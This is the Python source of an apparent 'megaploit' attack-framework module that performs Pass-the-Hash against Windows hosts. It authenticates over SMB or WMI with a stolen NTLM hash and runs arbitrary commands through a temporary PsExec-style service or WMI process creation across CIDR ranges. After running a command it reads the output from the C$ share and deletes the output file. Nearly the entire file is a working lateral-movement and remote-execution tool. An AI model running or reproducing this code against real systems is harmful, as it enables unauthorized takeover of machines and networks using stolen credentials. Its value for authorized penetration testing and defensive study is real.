"""
megaploit.modules.auxiliary.kerberos_pass_the_hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Pass-the-Hash (PtH) — authenticate to Windows services using an NTLM hash
instead of a cleartext password.

Supported targets:
  - SMB   (execute remote command via PsExec-style service creation)
  - WMI   (execute via Windows Management Instrumentation)

References
----------
* https://attack.mitre.org/techniques/T1550/002/
* https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
* https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
"""

from __future__ import annotations

import socket
from megaploit.modules.base import Module, ModuleType, OptionType


class PassTheHashModule(Module):
    name        = "auxiliary/kerberos/pass_the_hash"
    description = (
        "Pass-the-Hash: authenticate to SMB or WMI using an NTLM hash; "
        "execute a command on the remote system without knowing the plaintext password"
    )
    module_type = ModuleType.AUXILIARY
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1550/002/",
        "https://github.com/SecureAuthCorp/impacket",
    ]
    platform    = ["windows"]; arch = []; rank = 400

    def _define_options(self) -> None:
        self._opt("RHOSTS",   OptionType.STRING,  required=True,
                  description="Target host IP(s) or CIDR")
        self._opt("DOMAIN",   OptionType.STRING,  default="WORKGROUP",
                  description="Domain or workgroup name")
        self._opt("USERNAME", OptionType.STRING,  required=True,
                  description="Target username (e.g. Administrator)")
        self._opt("NTLM_HASH", OptionType.STRING, required=True,
                  description="NTLM hash  LM:NT  or  :NT  (e.g. aad3b435…:8846f7e…)")
        self._opt("CMD",      OptionType.STRING,  default="whoami /all",
                  description="Command to execute on the target")
        self._opt("METHOD",   OptionType.ENUM,    default="smb",
                  choices=["smb", "wmi"],
                  description="Execution method: smb (PsExec-style) or wmi")
        self._opt("TIMEOUT",  OptionType.INTEGER, default=15, required=False,
                  description="Socket timeout in seconds")

    def check(self, session=None) -> str:
        self.validate()
        host    = str(self.get("RHOSTS")).split(",")[0].strip()
        timeout = int(self.get("TIMEOUT"))
        try:
            with socket.create_connection((host, 445), timeout=timeout):
                return f"[+] {host}:445 — SMB reachable"
        except OSError as e:
            return f"[-] {host}:445 — {e}"

    def run(self, session=None) -> list:
        self.validate()
        self.results.clear()

        rhosts   = str(self.get("RHOSTS"))
        domain   = str(self.get("DOMAIN"))
        username = str(self.get("USERNAME"))
        ntlm     = str(self.get("NTLM_HASH"))
        cmd      = str(self.get("CMD"))
        method   = str(self.get("METHOD")).lower()
        timeout  = int(self.get("TIMEOUT"))

        # Parse LM:NT or :NT format
        if ":" in ntlm:
            lmhash_hex, nthash_hex = ntlm.split(":", 1)
        else:
            lmhash_hex, nthash_hex = "", ntlm

        try:
            lmhash = bytes.fromhex(lmhash_hex.zfill(32))
            nthash = bytes.fromhex(nthash_hex.zfill(32))
        except ValueError as e:
            return [self._fail(f"Invalid NTLM hash format: {e}")]

        try:
            from impacket.examples.secretsdump import RemoteOperations
        except (ImportError, OSError):
            return [self._fail("impacket not installed — pip install impacket")]

        hosts = list(self.expand_cidr(rhosts)) if "/" in rhosts else [rhosts]
        self._emit(f"[*] PtH via {method.upper()} — {len(hosts)} target(s)  cmd={cmd!r}")

        def _attack(host: str) -> None:
            if self._stopped():
                return
            try:
                if method == "smb":
                    self._pth_smb(host, domain, username, lmhash, nthash,
                                  cmd, timeout)
                else:
                    self._pth_wmi(host, domain, username, lmhash, nthash,
                                  cmd, timeout)
            except Exception as exc:
                self._fail(f"{host} — {exc}", host=host)

        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=min(5, len(hosts))) as pool:
            list(pool.map(_attack, hosts))

        ok = sum(1 for r in self.results if r.ok)
        self._emit(f"[+] Done — {ok}/{len(hosts)} succeeded")
        return self.results

    # ------------------------------------------------------------------

    def _pth_smb(self, host, domain, username, lmhash, nthash, cmd, timeout):
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import transport, svcctl
        import uuid, time

        smb = SMBConnection(host, host, timeout=timeout)
        smb.login(username, "", domain, lmhash=lmhash, ntHash=nthash)

        # Create a temporary service and execute the command (PsExec-style)
        svc_name = "mploit" + uuid.uuid4().hex[:6]
        bind_str = r"ncacn_np:%s[\pipe\svcctl]" % host
        rpctransport = transport.DCERPCTransportFactory(bind_str)
        rpctransport.setRemoteHost(host)
        rpctransport.set_smb_connection(smb)
        dce = rpctransport.get_dce_rpc()
        dce.connect(); dce.bind(svcctl.MSRPC_UUID_SVCCTL)
        scm  = svcctl.hROpenSCManagerW(dce)["lpScHandle"]
        try:
            svcctl.hRCreateServiceW(
                dce, scm, svc_name, svc_name,
                lpBinaryPathName=f"cmd.exe /c {cmd} > C:\\Windows\\Temp\\{svc_name}.out 2>&1",
                dwStartType=svcctl.SERVICE_DEMAND_START,
            )
            svc = svcctl.hROpenServiceW(dce, scm, svc_name)["lpServiceHandle"]
            svcctl.hRStartServiceW(dce, svc)
            time.sleep(2)
            svcctl.hRDeleteService(dce, svc)
            svcctl.hRCloseServiceHandle(dce, svc)
            # Read output
            try:
                fid  = smb.openFile(
                    smb.connectTree("C$"),
                    f"Windows\\Temp\\{svc_name}.out"
                )
                out  = smb.readFile(smb.connectTree("C$"), fid).decode("utf-8", "replace")
                smb.deleteFile("C$", f"Windows\\Temp\\{svc_name}.out")
            except Exception:
                out = "(output file not accessible)"
            self._ok(f"{host} — command executed via SMB PsExec",
                     host=host, output=out, cmd=cmd)
        finally:
            svcctl.hRCloseServiceHandle(dce, scm)
            smb.logoff()

    def _pth_wmi(self, host, domain, username, lmhash, nthash, cmd, timeout):
        from impacket.dcerpc.v5.dcomrt import DCOMConnection
        from impacket.dcerpc.v5.dcom import wmi
        from impacket.dcerpc.v5.dcom.wmi import WBEM_FLAG_FORWARD_ONLY

        dcom = DCOMConnection(host, username=username, password="",
                              domain=domain, lmhash=lmhash.hex(), nthash=nthash.hex())
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,
                                                 wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices    = iWbemLevel1Login.NTLMLogin("//./root/cimv2", "", "")
            iWbemLevel1Login.RemRelease()

            win32_process, _ = iWbemServices.GetObject("Win32_Process")
            result = win32_process.Create(cmd, "C:\\", None)
            pid    = result.getProperties()["ProcessId"]["value"]
            self._ok(f"{host} — WMI command executed (PID={pid})",
                     host=host, pid=pid, cmd=cmd)
        finally:
            dcom.disconnect()


MODULE = PassTheHashModule
